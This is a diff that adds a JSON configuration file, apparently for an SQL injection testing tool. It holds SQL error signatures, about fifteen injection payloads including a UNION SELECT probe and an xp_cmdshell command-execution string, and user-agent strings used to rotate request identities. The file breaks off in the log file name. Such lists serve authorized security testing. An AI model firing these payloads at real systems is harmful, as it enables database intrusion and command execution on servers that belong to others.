@@ -1,0 +1,36 @@
+{
+    "sql_errors": [
+        "you have an error in your sql syntax",
+        "warning: mysql",
+        "unclosed quotation mark after the character string",
+        "quoted string not properly terminated",
+        "error executing query",
+        "sqlstate",
+        "unexpected end of SQL command"
+    ],
+    "sql_payloads": [
+        "' OR '1'='1",
+        "' OR 'a'='a",
+        "' UNION SELECT NULL, NULL, NULL--",
+        "' OR 1=1--",
+        "' OR 'x'='x",
+        "' AND 1=2--",
+        "' AND 'a'='a",
+        "' AND 1=1--",
+        "' OR 1=1#",
+        "' OR 'x'='x' AND 'x'='x",
+        "\" OR 1=1--",
+        "\" OR '1'='1",
+        "' OR 'x'='x';--",
+        "'; EXEC xp_cmdshell('dir');--",
+        "1' AND 1=(SELECT COUNT(*) FROM tabname); --",
+        "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --"
+    ],
+    "user_agents": [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
+    ],
+    "proxies": [],
+    "log_file": "sql_injection_test_results
